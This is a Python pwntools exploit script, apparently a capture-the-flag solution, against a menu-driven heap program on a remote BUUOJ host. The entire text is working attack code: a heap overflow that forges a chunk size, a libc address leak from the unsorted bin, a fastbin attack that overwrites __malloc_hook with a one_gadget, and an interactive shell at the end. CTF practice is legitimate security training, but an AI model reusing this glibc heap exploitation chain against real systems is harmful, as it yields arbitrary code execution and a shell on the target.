from pwn import *
#p=process('./1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
p=remote('node3.buuoj.cn',28996)
libc=ELF('libc-2.23_64.so')
context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
def show():
    p.recvuntil('Your choice:')
    p.sendline('1')
def add(len,con):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('Please enter the length of servant name:')
    p.sendline(str(len))
    p.recvuntil('Please enter the name of servant:')
    p.sendline(str(con))
def change(idx,len,con):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil('Please enter the index of servant:')
    p.sendline(str(idx))
    p.recvuntil('Please enter the length of servant name:')
    p.sendline(str(len))
    p.recvuntil('Please enter the new name of the servnat:')
    p.send(str(con))
def remove(idx):
    p.recvuntil('Your choice:')
    p.sendline('4')
    p.recvuntil('Please enter the index of servant:')
    p.sendline(str(idx))
add(0x18,'aaaa')#0
add(0x18,'bbbb')#1
add(0x98,'aaaa')#2
add(0x98,'bbbb')#3
add(0x98,'cccc')#4
add(0x18,'dddd')#5
change(1,0x30,0x18*'a'+p64(0xa1+0xa0))
remove(2)
add(0x98,'eeee')#2
show()
#libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['main_arena']-88
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b20-88
print hex(libc.address)
print hex(libc.sym['__malloc_hook'])
add(0x98,'eeee')#6
add(0x10,'aaaa')#7
add(0x68,'aaaa')#8
remove(8)
change(7,0x30,0x18*'a'+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
add(0x68,'aaaa')#8
og=[0x45216,0x4526a,0xf02a4,0xf1147]
ogg=libc.address+og[0]
add(0x68,11*'a'+p64(ogg)+p64(libc.sym['realloc']))
sleep(0.2)
p.sendline('2')
sleep(0.2)
p.sendline('32')
p.interactive()
